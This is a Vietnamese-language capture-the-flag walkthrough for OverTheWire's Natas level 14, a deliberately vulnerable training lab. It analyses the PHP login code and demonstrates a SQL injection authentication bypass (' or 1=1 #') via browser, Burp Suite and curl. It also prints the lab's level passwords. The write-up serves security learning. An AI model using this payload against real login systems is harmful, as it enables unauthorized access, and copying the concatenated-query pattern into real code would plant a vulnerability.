# Level 14 -> Level 15

Username: [         ]
Password: [         ]
[Login]

---

## 1. THÔNG TIN TRUY CẬP (DÙNG PASSWORD TÌM ĐƯỢC TỪ NATAS 13)

- **URL**: `http://natas14.natas.labs.overthewire.org`
- **Username**: `natas14`
- **Password**: `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`
- **Giao thức xác thực**: HTTP Basic Authentication

---

## 2. THỬ THÁCH & KIẾN THỨC NỀN TẢNG CỦA LEVEL 14

### Thử thách
Giao diện trang web hiển thị một biểu mẫu đăng nhập gồm 2 trường nhập liệu: **Username** và **Password**.
Mục tiêu là vượt qua cơ chế xác thực để đăng nhập thành công và lấy mật khẩu của Level 15.

Bên dưới biểu mẫu có liên kết **`View sourcecode`**.

### Phân tích mã nguồn PHP (`index-source.html`)
Mở mã nguồn trang web, ta quan sát logic xác thực người dùng bằng cơ sở dữ liệu MySQL:

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

### Manh mối & Kiến thức cốt lõi: Vượt qua xác thực bằng SQL Injection (SQL Injection Authentication Bypass)

1. **Lỗ hổng ghép chuỗi SQL trực tiếp (String Concatenation)**:
   - Câu truy vấn SQL được tạo bằng cách nối chuỗi trực tiếp từ dữ liệu do người dùng gửi lên (`$_REQUEST["username"]` và `$_REQUEST["password"]`) mà không hề sử dụng cơ chế bảo vệ như Prepared Statements (Tham số hóa câu truy vấn) hay các hàm lọc/thoát ký tự (`mysqli_real_escape_string`):
     ```php
     $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
     ```
   - **Điểm đặc biệt cần lưu ý**: Giá trị của tham số trong câu lệnh SQL được bao bọc bởi **dấu ngoặc kép (`"`)**, thay vì dấu nháy đơn (`'`) như thường gặp:
     `username=\"...\" and password=\"...\"`.

2. **Cơ chế xác thực của ứng dụng**:
   - Hệ thống dùng hàm `mysqli_num_rows()` để đếm số dòng kết quả trả về từ truy vấn:
     ```php
     if(mysqli_num_rows(mysqli_query($link, $query)) > 0)
     ```
   - Điều này có nghĩa là ứng dụng không cần biết mật khẩu thực sự của tài khoản nào. Chỉ cần câu lệnh SQL trả về **ít nhất 1 dòng bản ghi bất kỳ** trong bảng `users`, điều kiện sẽ thỏa mãn và mật khẩu Level 15 sẽ được in ra.

3. **Kỹ thuật chèn mã SQL Injection (SQLi)**:
   - Để vô hiệu hóa điều kiện kiểm tra mật khẩu, ta chèn dấu ngoặc kép `"` để đóng chuỗi tham số `username`, sau đó thêm mệnh đề logic `OR` luôn đúng, và kết thúc bằng ký tự chú thích `#` (comment trong MySQL) để triệt tiêu toàn bộ phần kiểm tra mật khẩu phía sau:
     - **Payload Username**:
       ```sql
       " or 1=1 #
       ```
       *(hoặc `" or ""="`)*
     - **Password**: Điền ký tự bất kỳ (ví dụ: `a`).
   - Khi đó, câu lệnh SQL hoàn chỉnh gửi tới cơ sở dữ liệu sẽ biến thành:
     ```sql
     SELECT * from users where username="" or 1=1 #" and password="a"
     ```
   - Toàn bộ đoạn `#" and password="a"` phía sau sẽ bị MySQL bỏ qua như một ghi chú.
   - Điều kiện `where username="" or 1=1` luôn luôn trả về giá trị `TRUE` với mọi bản ghi trong bảng `users`.
   - Kết quả: `mysqli_num_rows > 0` $\rightarrow$ Đăng nhập thành công!

4. **Tính năng Debug hỗ trợ quan sát câu lệnh SQL**:
   - Trong mã nguồn có kiểm tra tham số GET `debug`:
     ```php
     if(array_key_exists("debug", $_GET)) {
         echo "Executing query: $query<br>";
     }
     ```
   - Nếu ta truy cập kèm tham số `?debug` (ví dụ: `http://natas14.natas.labs.overthewire.org/index.php?debug`), trang web sẽ hiển thị chính xác câu truy vấn SQL đang được thực thi trên máy chủ.

---

## 3. CÔNG CỤ CẦN DÙNG

- **Trình duyệt Web (Chrome, Edge, Firefox)**: Điền trực tiếp payload vào biểu mẫu trên giao diện.
- **Burp Suite**: Bắt gói tin POST và chỉnh sửa giá trị tham số.
- **Dòng lệnh CLI (cURL)**: Gửi request POST trực tiếp từ terminal.

---

## 4. CÁC BƯỚC THỰC HIỆN ĐỂ LẤY PASSWORD LEVEL 15

### Cách 1: Khai thác trực tiếp trên giao diện Trình duyệt (Nhanh nhất)

- **Bước 1**: Mở trình duyệt và truy cập đường dẫn:
  ```text
  http://natas14.natas.labs.overthewire.org
  ```
  *(Có thể truy cập đường dẫn có tham số `?debug` để quan sát câu truy vấn SQL: `http://natas14.natas.labs.overthewire.org/index.php?debug`)*.

  Đăng nhập với tài khoản:
  - **User**: `natas14`
  - **Pass**: `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`

- **Bước 2**: Tại form đăng nhập trên màn hình, điền các giá trị:
  - **Username**:
    ```text
    " or 1=1 #
    ```
    *(hoặc điền `" or ""="`)*
  - **Password**: Nhập một ký tự bất kỳ (ví dụ: `a`).

- **Bước 3**: Bấm nút **Login**.

- **Bước 4**: Màn hình trả về thông báo đăng nhập thành công kèm mật khẩu của Level 15:
  ```text
  Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
  ```

---

### Cách 2: Sử dụng Burp Suite

- **Bước 1**: Mở trình duyệt tích hợp của Burp Suite (`Open browser`) và truy cập đường dẫn:
  ```text
  http://natas14.natas.labs.overthewire.org
  ```
  Đăng nhập với tài khoản:
  - **User**: `natas14`
  - **Pass**: `A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8`

- **Bước 2**: Trên form đăng nhập của trang web:
  - Nhập **Username**: `admin`
  - Nhập **Password**: `123`
- **Bước 3**: Chuyển sang Burp Suite, vào tab **`Proxy`** $\rightarrow$ bấm bật **`Intercept is on`**.
- **Bước 4**: Quay lại trình duyệt và bấm nút **Login**.
- **Bước 5**: Gói tin POST gửi dữ liệu đăng nhập bị giữ lại tại tab `Intercept`:
  ```http
  POST /index.php HTTP/1.1
  Host: natas14.natas.labs.overthewire.org
  Authorization: Basic bmF0YXMxNDpBMHhYdTJ4OUZXOHJiOE9TUTRlaTZuNVZCYkxVejhoOA==
  Content-Type: application/x-www-form-urlencoded

  username=admin&password=123
  ```
  Chỉnh sửa dòng dữ liệu form ở cuối thành:
  ```http
  username=" or 1=1 #&password=123
  ```
- **Bước 6**: Bấm nút màu cam **`Forward`** để gửi gói tin đi.
- **Bước 7**: Trên màn hình trình duyệt, bạn sẽ nhận được thông báo:
  ```text
  Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
  ```

---

### Cách 3: Sử dụng dòng lệnh PowerShell / Terminal với cURL

Gửi gói tin POST chứa payload SQL Injection trực tiếp từ dòng lệnh:

```powershell
curl.exe -s -u natas14:A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8 -d "username=%22+or+1%3D1+%23" -d "password=a" "http://natas14.natas.labs.overthewire.org/index.php?debug"
```

*(Giải thích: `%22` tương ứng với dấu `"`, dấu `+` tương ứng với khoảng trắng, `%3D` là dấu `=` và `%23` là dấu `#` khi được mã hóa URL để tránh xung đột ký tự đặc biệt trong terminal)*.

Kết quả trả về trên màn hình:
```text
Executing query: SELECT * from users where username="" or 1=1 #" and password="a"
Successful login! The password for natas15 is GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
```

---

## 5. KẾT QUẢ / MẬT KHẨU LEVEL 15

```text
Password natas15: [GB6USCJYJjwLyYhZUNkE1NwDueiTow6g]
```
